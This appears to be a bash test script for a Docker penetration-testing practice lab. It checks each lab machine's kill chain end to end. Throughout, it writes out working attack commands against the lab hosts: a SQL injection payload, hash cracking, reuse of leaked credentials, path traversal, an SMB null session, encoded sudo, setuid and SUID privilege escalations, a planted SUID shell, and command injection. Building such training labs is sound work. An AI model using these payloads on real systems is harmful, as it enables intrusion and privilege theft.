#!/bin/bash
# eJPT Lab — barcha kill-chain'larni attacker konteyneridan tekshiradi.
# Ishlatish: docker compose up -d  &&  bash test-killchains.sh
set -u
A="docker exec ejpt-attacker sh -c"
pass=0; fail=0
chk(){ if echo "$2" | grep -q "$1"; then echo "  [PASS] $3"; pass=$((pass+1)); else echo "  [FAIL] $3 -- got: $(echo "$2"|tr '\n' ' '|cut -c1-120)"; fail=$((fail+1)); fi; }

echo "### 0) Host discovery + services"
OUT=$($A "nmap -sn 10.10.20.0/24 2>/dev/null | grep -oE '10.10.20.[0-9]+' | sort -u")
echo "$OUT" | sed 's/^/    /'
chk "10.10.20.10" "$OUT" "web-01 topildi"
chk "10.10.20.20" "$OUT" "linux-02 topildi"
chk "10.10.20.30" "$OUT" "smb-03 topildi"

echo "### 1) web-01: SQLi -> creds -> upload RCE -> www-data -> root"
# UNION SQLi -> sysadmin cred
SQLI=$($A "curl -s 'http://10.10.20.10/search.php?q=%25%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-'")
chk "acme02" "$SQLI" "UNION SQLi sysadmin md5crypt hashini dump qildi (crack->SSH)"
# crack the leaked md5crypt hash with john (in the container) -> SSH password
# NOTE: haqiqiy labda rockyou bilan buziladi (jimmyis22 ~7M-qatorda, bir necha daqiqa).
# Bu test tez bo'lishi uchun kichik ephemeral wordlist ishlatadi — hash<->parol mosligini tekshiradi.
CPW=$($A "H=\$(curl -s 'http://10.10.20.10/search.php?q=%25%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-' | grep -oE 'sysadmin</td><td>[^<]+' | sed 's/.*<td>//'); rm -f /root/.john/john.pot; printf 'decoy1\njimmyis22\ndecoy2\n' > /tmp/wl.txt; printf 'sysadmin:%s\n' \"\$H\" > /tmp/h.txt; john --format=md5crypt --wordlist=/tmp/wl.txt /tmp/h.txt >/dev/null 2>&1; john --show /tmp/h.txt 2>/dev/null | head -1 | cut -d: -f2")
chk "jimmyis22" "$CPW" "SQLi md5crypt hash -> john crack -> SSH parol (jimmyis22)"
UF=$($A "sshpass -p 'jimmyis22' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@10.10.20.10 'cat /var/www/html/user.txt' 2>/dev/null")
chk "EJPT{" "$UF" "web-01 USER flag (crack -> SSH foothold)"
# privesc via ssh sysadmin + sudo python3
ROOT=$($A "sshpass -p 'jimmyis22' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@10.10.20.10 'sudo /usr/bin/python3 -c \"import os;os.system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116))\"' 2>/dev/null")
chk "EJPT{" "$ROOT" "web-01 ROOT flag (sudo python3)"

echo "### 1a) web-easy: ochiq config -> SSH deploy -> sudo bash -> root"
EC=$($A "curl -s http://10.10.20.40/config.old | grep -oE 'ssh_pass = .+'")
chk "D3ploy2024!" "$EC" "web-easy: config.old SSH cred sizdi"
EUF=$($A "sshpass -p 'D3ploy2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@10.10.20.40 'cat /home/deploy/user.txt' 2>/dev/null")
chk "EJPT{" "$EUF" "web-easy USER flag (SSH)"
ERF=$($A "sshpass -p 'D3ploy2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@10.10.20.40 'sudo /bin/bash -c \"cat /root/root.txt\"' 2>/dev/null")
chk "EJPT{" "$ERF" "web-easy ROOT flag (sudo bash)"

echo "### 1b) web-hard: LFI -> SSH webadmin -> perl cap_setuid -> root"
HL=$($A "curl -s 'http://10.10.20.50/view.php?page=../../../../opt/monitor/deploy_notes.txt' | grep -oE 'pass: .+'")
chk "W3bM0n1t0r2024!" "$HL" "web-hard: LFI SSH cred sizdi"
HUF=$($A "sshpass -p 'W3bM0n1t0r2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null webadmin@10.10.20.50 'cat /home/webadmin/user.txt' 2>/dev/null")
chk "EJPT{" "$HUF" "web-hard USER flag (LFI->SSH)"
HRF=$($A "sshpass -p 'W3bM0n1t0r2024!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null webadmin@10.10.20.50 'perl -e \"use POSIX qw(setuid); POSIX::setuid(0); exec chr(47).chr(98).chr(105).chr(110).chr(47).chr(99).chr(97).chr(116).chr(32).chr(47).chr(114).chr(111).chr(111).chr(116).chr(47).chr(114).chr(111).chr(111).chr(116).chr(46).chr(116).chr(120).chr(116);\"' 2>/dev/null")
chk "EJPT{" "$HRF" "web-hard ROOT flag (perl cap_setuid)"

echo "### 2) linux-02: anon FTP hint -> ssh bob -> SUID find -> root"
FTP=$($A "curl -s ftp://10.10.20.20/note_to_bob.txt")
chk "rockyou" "$FTP" "anon FTP note (bob parol hint -> rockyou)"
LUF=$($A "sshpass -p coconut ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@10.10.20.20 'cat /home/bob/user.txt' 2>/dev/null")
chk "EJPT{" "$LUF" "linux-02 USER flag (ssh bob:coconut)"
LRF=$($A "sshpass -p coconut ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@10.10.20.20 \"find /home/bob/user.txt -exec /bin/sh -p -c 'cat /root/root.txt' \\;\" 2>/dev/null")
chk "EJPT{" "$LRF" "linux-02 ROOT flag (SUID find)"

echo "### 3) smb-03: null session -> creds -> ssh carol -> writable script -> root"
SMB=$($A "smbclient //10.10.20.30/public -N -c 'get credentials.txt /tmp/cr.txt' 2>/dev/null; cat /tmp/cr.txt 2>/dev/null")
chk "Fil3s3rv3r2025" "$SMB" "SMB null session creds leak"
SUF=$($A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@10.10.20.30 'cat /home/carol/user.txt' 2>/dev/null")
chk "EJPT{" "$SUF" "smb-03 USER flag (ssh carol)"
# writable-script privesc: overwrite, wait for root loop, use SUID bash
$A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@10.10.20.30 'echo \"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\" > /opt/maintenance/cleanup.sh' 2>/dev/null"
sleep 24
SRF=$($A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@10.10.20.30 '/tmp/rootbash -p -c \"cat /root/root.txt\"' 2>/dev/null")
chk "EJPT{" "$SRF" "smb-03 ROOT flag (writable root script -> SUID bash)"

echo "### 4) PIVOT: web-01 -> internal-04 (command injection) -> FINAL flag"
# attacker CANNOT reach 10.10.10.20 directly:
DIRECT=$($A "curl -s --max-time 5 http://10.10.10.20:8080/ 2>&1 | head -c 40; echo")
echo "    (attacker->internal to'g'ridan: '$DIRECT')"
# web-01 buzilgan -> o'sha hostdan ichki 10.10.10.20 ga command injection:
PIV=$(docker exec ejpt-web-01 sh -c "curl -s 'http://10.10.10.20:8080/ping?host=127.0.0.1;cat%20/flag.txt'")
chk "EJPT{" "$PIV" "internal-04 FINAL flag (pivot + cmd injection)"

echo ""
echo "### NATIJA: PASS=$pass  FAIL=$fail"
